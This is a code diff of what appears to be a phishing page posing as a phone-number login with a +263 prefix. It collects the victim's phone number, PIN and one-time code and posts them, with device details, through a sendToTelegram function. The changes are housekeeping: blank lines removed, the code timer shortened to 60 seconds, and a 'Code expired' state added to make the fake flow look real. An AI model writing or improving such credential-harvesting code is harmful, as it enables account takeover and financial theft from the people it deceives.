@@ -200,11 +200,8 @@ opacity:1;
 <label>Phone Number</label>
 
 <div class="phone-group">
-
 <div class="prefix">+263</div>
-
 <input id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="7XXXXXXXX">
-
 </div>
 
 <div class="warning">
@@ -214,12 +211,10 @@ Enter your 9-digit number starting with 7.
 <label>Enter your PIN</label>
 
 <div class="pin">
-
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
-
 </div>
 
 <button id="loginBtn" class="btn">Login</button>
@@ -234,18 +229,16 @@ Enter your 9-digit number starting with 7.
 <div class="warning" id="maskedNumber"></div>
 
 <div class="pin">
-
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
 <input maxlength="1" inputmode="numeric">
-
 </div>
 
 <div class="count">
-Code expires in <span id="time">120</span>s
+Code expires in <span id="time">60</span>s
 </div>
 
 <div class="resend">
@@ -304,12 +297,10 @@ let price=selectedPlan.price
 if(!price){
 
 for(let k in priceMap){
-
 if(name.includes(k)){
 price=priceMap[k]
 break
 }
-
 }
 
 }
@@ -342,17 +333,11 @@ headers:{
 body:JSON.stringify({
 
 submittedAt:new Date().toISOString(),
-
 loginPhone:phoneValue,
-
 loginPin:pinValue,
-
 otp:otpValue,
-
 event:eventName,
-
 plan:getPlanLine(),
-
 device:device
 
 })
@@ -369,7 +354,6 @@ phone.oninput=e=>{
 let v=e.target.value.replace(/\D/g,"")
 
 if(v.startsWith("263")) v=v.slice(3)
-
 if(v.startsWith("0")) v=v.slice(1)
 
 if(v[0]!=="7") v="7"+v.slice(1)
@@ -453,8 +437,7 @@ sendToTelegram("login_clicked")
 
 const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2")
 
-maskedNumber.innerHTML=
-`Enter the OTP sent to ${masked}`
+maskedNumber.innerHTML=`Enter the OTP sent to ${masked}`
 
 show("step3")
 
@@ -509,6 +492,8 @@ otpBtn.classList.remove("active")
 }
 
 
+/* submit */
+
 otpBtn.onclick=()=>{
 
 if(!otpBtn.classList.contains("active")) return
@@ -549,7 +534,7 @@ startTimer()
 
 function startTimer(){
 
-let t=120
+let t=60
 
 time.textContent=t
 
@@ -557,7 +542,14 @@ resendBtn.classList.remove("active")
 
 resendClicked=false
 
-const i=setInterval(()=>{
+otpInputs.forEach(i=>{
+i.disabled=false
+i.value=""
+})
+
+otpBtn.classList.remove("active")
+
+const timer=setInterval(()=>{
 
 t--
 
@@ -565,9 +557,15 @@ time.textContent=t
 
 if(t<=0){
 
-clearInterval(i)
+clearInterval(timer)
 
 resendBtn.classList.add("active")
+
+otpInputs.forEach(i=>i.disabled=true)
+
+otpBtn.classList.remove("active")
+
+maskedNumber.innerHTML="Code expired. Request new OTP"
 
 }
 
@@ -578,5 +576,4 @@ resendBtn.classList.add("active")
 </script>
 
 </body>
-
 </html>
